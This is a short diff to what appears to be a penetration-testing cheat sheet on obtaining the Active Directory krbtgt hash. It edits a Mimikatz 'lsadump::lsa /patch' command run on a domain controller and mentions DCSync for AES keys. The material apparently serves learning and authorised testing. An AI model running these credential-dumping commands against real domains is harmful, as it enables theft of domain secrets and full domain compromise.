@@ -12,7 +12,7 @@ There are multiple ways to get the krbtgt account hash
 
 ```powershell
 # Execute on DC as Domain Admin
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 # DCSync to get AES keys
 # Needs Domain admin or Replication Rights
